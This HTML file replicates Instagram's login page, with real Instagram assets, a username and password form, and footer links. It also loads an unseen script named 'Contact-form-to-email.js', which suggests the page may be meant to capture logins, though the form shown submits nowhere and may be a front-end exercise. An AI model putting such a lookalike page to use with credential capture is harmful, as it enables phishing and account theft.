<!DOCTYPE html>
<html lang="en">

<head>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/x-icon" href="logo.png">
    <script src="Contact-form-to-email.js"></script>
    <script src="app.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
</head>

<body>
    <main>
        <section id="photos-ctr">
            <img src="https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png"
                alt="Two smart phones, one black, one white, the white one overlapping the other; both phone screen display example images from the website.">
            <div id="phone-display">
                <img id="image-1"
                    src="https://www.instagram.com/static/images/homepage/screenshot1.jpg/d6bf0c928b5a.jpg"
                    alt="A woman standing in front of many tall cacti.">
                <img id="image-2"
                    src="https://www.instagram.com/static/images/homepage/screenshot2.jpg/6f03eb85463c.jpg"
                    alt="A potted orange Desert Cabbage against a blue wall.">
                <img id="image-3"
                    src="https://www.instagram.com/static/images/homepage/screenshot3.jpg/f0c687aa6ec2.jpg"
                    alt="Text conversation contianing images of cats and cat puns.">
                <img id="image-4"
                    src="https://www.instagram.com/static/images/homepage/screenshot4.jpg/842fe5699220.jpg"
                    alt="Top view of a green Tree Aeonium plant.">
                <img id="image-5"
                    src="https://www.instagram.com/static/images/homepage/screenshot5.jpg/0a2d3016f375.jpg"
                    alt="Instagram profile display for Jane Appleseed.">
            </div>
        </section>

        <section id="details-ctr">
            <div id="login-ctr">
                <div id="logo">
                    <img src="https://pbs.twimg.com/media/E_mOsqtXoAQLmN0?format=png&name=240x240"
                        alt="Instragram logo; the text reads 'Instagram', written in the platform's iconic cursive font.">
                </div>
                <div id="login">
                    <form id="login-form" action="#">
                        <div class="form-group">
                            <input id="username" class="form-input" name="username"
                                placeholder="Phone number, username, or email"
                                title="Must be a valid phone number, username, or email." onkeyup="stateHandle()"
                                required type="text">
                            <label class="floating-label" for="username">Phone number, username, or email</label>
                        </div>
                        <div class="form-group">
                            <input id="password" class="form-input"
                                placeholder="Password"
                                title="Must contain at least one number, one uppercase and lowercase letter, and at least 8 or more characters."
                                oninput="stateHandle()" required type="password">
                            <label class="floating-label" for="password">Password</label>
                            <button id="show-btn" onclick="showPassword()" type="button">Show</button>
                            <button id="hide-btn" onclick="showPassword()" type="button">Hide</button>
                        </div>
                        <input formaction="#" href="#" id="login-btn" name="submit" type="submit" value="Log In">
                    </form>
                </div>
                <div id="alt-options">
                    <div id="or-separator">
                        <div></div>
                        <p>Or</p>
                        <div></div>
                    </div>
                    <div id="fb-login">
                        <a href="#"><img src="https://pbs.twimg.com/media/E_mOlZ9XMAIU4bI?format=webp&name=tiny">
                            <h5>Log in with Facebook</h5>
                        </a>
                    </div>
                    <div id="pw-forgot">
                        <p><a href="#">Forgot password?</a></p>
                    </div>
                </div>
            </div>
            <div id="sign-up-ctr">
                <p>Don't have an account? <span><a href="#">Sign Up</a></span></p>
            </div>
            <div id="get-app-ctr">
                <p>Get the app.</p>
                <div>
                    <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo" target="_blank"><img
                            src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
                            alt="Download on the App Store"></a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=4179E4D0-FB3D-4ABE-B9F3-4495B781021B&utm_content=lo&utm_medium=badge"
                        target="_blank"><img
                            src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                            alt="Get it on Google Play"></a>
                </div>
            </div>
        </section>
    </main>

    <footer>
        <div id="footer-ctr">
            <div>
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Top Accounts</a>
                <a href="#">Hashtags</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
            </div>
            <div>
                <a href="#">Beauty</a>
                <a href="#">Dance</a>
                <a href="#">Fitness</a>
                <a href="#">Foot & Drink</a>
                <a href="#">Home & Garden</a>
                <a href="#">Music</a>
                <a href="#">Visual Arts</a>
            </div>
            <div>
                <select>
                    <option value="en">English</option>
                    <option value="en">English</option>
                </select>
                <p id="select-replace">English</p>
                <div id="select-carrot-wrap">
                    <span>
                        <svg id="select-carrot" role="img" viewBox="0 0 24 24" height="12" width="12">
                            <path
                                d="M21 17.502a.997.997 0 01-.707-.293L12 8.913l-8.293 8.296a1 1 0 11-1.414-1.414l9-9.004a1.03 1.03 0 011.414 0l9 9.004A1 1 0 0121 17.502z">
                            </path>
                        </svg>
                    </span>

                </div>
                <p id="meta-gram">Â© 2021 Instagram from Meta</p>
            </div>
        </div>
    </footer>

    <script type="text/javascript" src="ig-clone-java.js"></script>

</body>

</html>
